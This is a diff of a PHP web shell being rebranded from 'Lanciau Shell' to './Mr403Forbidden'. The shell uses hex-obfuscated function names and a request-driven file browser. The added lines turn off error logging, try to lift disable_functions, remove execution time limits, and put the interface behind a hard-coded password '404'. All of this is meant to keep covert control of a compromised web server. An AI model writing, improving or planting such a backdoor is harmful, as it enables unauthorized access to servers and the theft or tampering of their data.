@@ -18,18 +18,50 @@ $Array = [
 	for ($i = 0; $i < $hitung_array; $i++) {
 		$fungsi[] = unhex($Array[$i]);
 	}
+	error_reporting(0);
+	@clearstatcache();
+	@mb_internal_encoding('UTF-8');
+	set_time_limit(0);
+	@ini_set('error_log',null);
+	@ini_set('log_errors',0);
+	@ini_set('max_execution_time',0);
+	@ini_set('output_buffering',0);
+	@ini_set('display_errors', 0);
+	@ini_set('disable_functions', 0);
+	session_start();
+	date_default_timezone_set("Asia/Jakarta");
+	$_7 = array_merge($_POST, $_GET);
+	$_r = "required='required'";
+	$gcw = "getcwd";
+	$correctPassword = "404";
+	if (isset($_POST['pass'])) {
+		$enteredPassword = $_POST['pass'];
+
+		if ($enteredPassword === $correctPassword) {
+			$_SESSION['forbidden'] = true;
+		} else {
+			echo '<script>alert("Password Wrong!, Try Again.");</script>';
+		}
+	}
+	if (isset($_GET['logout'])) {
+		session_unset();
+		session_destroy();
+		header("Location: ".$_SERVER['PHP_SELF']);
+		exit();
+	}
+	if (!isset($_SESSION['forbidden'])) {
 	?>
 	<!DOCTYPE html>
 	<html>
 	<head>
-	<title>-=[ Lanciau Exploit ]=-</title>
-	<link rel='icon' href='https://raw.githubusercontent.com/Mr-7Mind/BahanShell/main/hehe.png'>
+	<title>-=[ ./Mr403Forbidden ]=-</title>
+	<link rel="SHORTCUT ICON" href="https://lh3.googleusercontent.com/YGqr3CRLm45jMF8eM8eQxc1VSERDTyzkv1CIng0qjcenJZxqV5DBgH5xlRTawnqNPcOp=w300"/>
 	<meta name="theme color" content="#00BFFF">
 	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
 	</head>
 	<style>
     body {
-        background-image: url("https://c.tenor.com/9IjLGaIiVLgAAAAC/tenor.gif");
+        background-image: url("https://images.pexels.com/photos/695644/pexels-photo-695644.jpeg");
         background-repeat: no-repeat;
         background-size: cover;
         background-position: center;
@@ -248,9 +280,9 @@ $Array = [
 	echo "
 	<html>
 	<head>
-		<title>Lanciau Exploit</title>
+		<title>./Mr403Forbidden</title>
 		<meta charset='UTF-8'>
-		<meta name='author' content='Lanciau Exploit'>
+		<meta name='author' content='./Mr403Forbidden'>
 		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
 		<link rel='icon' href='https://chat.openai.com/apple-touch-icon.png'>
 		<link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css'>
@@ -420,7 +452,7 @@ $Array = [
 	<div class='container-fluid'>
 	<div class='py-3' id='main'>
 		<div class='box shadow box-container p-4 rounded-3'>
-			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4 class='text-center'>Lanciau Shell</h4></a>";
+			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4 class='text-center'>./Mr403Forbidden</h4></a>";
 			if(isset($_7['path'])){
 				$path = unhex($_7['path']);
 				chdir($path);
@@ -1580,7 +1612,7 @@ $Array = [
 		?>
 		</tbody>
 		</table>
-		</div><div class='text-secondary'>&copy Lanciau Shell - 0xA</div>
+		</div><div class='text-secondary'>&copy ./Mr403Forbidden - 0xA</div>
 	</div>
 </div>
 </body>
